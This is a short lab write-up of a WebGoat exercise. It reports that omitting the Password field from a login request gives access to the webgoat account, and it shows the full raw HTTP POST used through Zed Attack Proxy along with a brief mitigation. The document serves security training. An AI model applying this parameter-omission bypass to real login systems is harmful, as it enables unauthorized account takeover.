## Vulnerability:

Logging in as webgoat user without providing password is possible. It was observed that do not sending 'Password' field in the request body allows to log in.

Expected request body:
```
Username=<login>&Password=<password>&SUBMIT=Login
```

Sent request body:
```
Username=webgoat&SUBMIT=Login
```

It seems that backend logic checks password only if it explicitly provided in the input form.

## Exploitation:

I used Zed Attack Proxy to exploit this vulnerability. Sending following request grants access to webgoat account.

```
POST http://webgoat.hacking-lab.com/attack?Screen=39&menu=1000 HTTP/1.1
Proxy-Connection: keep-alive
Content-Length: 29
Cache-Control: max-age=0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Origin: http://webgoat.hacking-lab.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/39.0.2171.65 Chrome/39.0.2171.65 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Referer: http://webgoat.hacking-lab.com/attack?Screen=39&menu=1000
Accept-Language: en-US,en;q=0.8
Cookie: JSESSIONID=7EF7C71D975B0B9E4C63DF97F5ED7112
Host: webgoat.hacking-lab.com

Username=webgoat&SUBMIT=Login
```

## Mitigation:

Fix backend logic to always check for the password. If password isn't present in the request form do not grant access. 
